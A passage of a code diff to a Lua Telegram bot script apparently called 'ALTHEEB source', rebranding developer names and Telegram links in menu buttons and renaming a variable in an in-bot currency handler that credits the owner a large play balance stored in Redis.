 {text = '❲ 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓🎖 ❳', url = "https://t.me/e_b50"}
 },
 {
-{text = '- ALTHEEB .', url = "https://t.me/e_b511"}
-},
-{
-{text = '- REDWAN .', url = "https://t.me/Redwanraw"}
+{text = '- TRAKOS .', url = "https://t.me/e_b50"}
 },
 }
 }
@@ -5336,11 +5056,11 @@ data = {
 {text = '❲ 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓🎖 ❳', url = "https://t.me/e_b50"}
 },
 {
-{text = '- ALTHEEB .', url = "https://t.me/e_b511"}
+{text = '- dev .', url = "https://t.me/e_b50"}
 },
 }
 }
-return LuaTele.sendText(msg_chat_id,msg_id,"[ ALTHEEB SOURCE .](t.me/e_b50)\n\n[ سورس الذيب ،](t.me/e_b50)","md",true, false, false, false,reply_markup)
+return LuaTele.sendText(msg_chat_id,msg_id,"[ALTHEEB SOURCE .](t.me/e_b50)\n\n[ سورس الذيب ،](t.me/e_b50)","md",true, false, false, false,reply_markup)
 end
 if text == 'تعطيل التحقق' then
 if not msg.Addictive then
@@ -11465,10 +11185,10 @@ return LuaTele.sendText(msg_chat_id,msg_id,'\n• الامر يخص ( '..Control
 end
     K = 'المالك'
     F = '1000000000000000000'
-    ALTHEEB = "Was Die . - المالك"
+    trakos = "Was Die . - المالك"
 Redis:incrby(FDFGERB.."nool:flotysb"..msg.sender.user_id , F)
 local ballancee = Redis:get(FDFGERB.."nool:flotysb"..msg.sender.user_id) or 0
-local teex = "اشعار ايداع "..ALTHEEB.."\nالمبلغ : "..F.." بتكوين 🪙\nوظيفتك : مالك البوت وعلى راسي \nنوع العملية : اضافة الاستحقاق\nرصيدك الآن : "..ballancee.." بتكوين 🪙"
+local teex = "اشعار ايداع "..trakos.."\nالمبلغ : "..F.." بتكوين 🪙\nوظيفتك : مالك البوت وعلى راسي \nنوع العملية : اضافة الاستحقاق\nرصيدك الآن : "..ballancee.." بتكوين 🪙"
 LuaTele.sendText(msg.chat_id,msg.id,teex,"md",true)
 Redis:setex(FDFGERB.."innoo" .. msg.sender.user_id,600, true)
 end
@@ -13305,7 +13025,7 @@ data = {
 {text = 'القائمه الرئيسيه', data = IdUser..'/helpall'},
 },
 {
-{text = '𝑺𝒐𝒖𝒓𝒄𝒆', url = 't.me/e_b50'}, 
+{text = '𝑺𝒐𝒖𝒓𝒄𝒆', url = 't.me/trprogram'}, 
 },
 }
 }
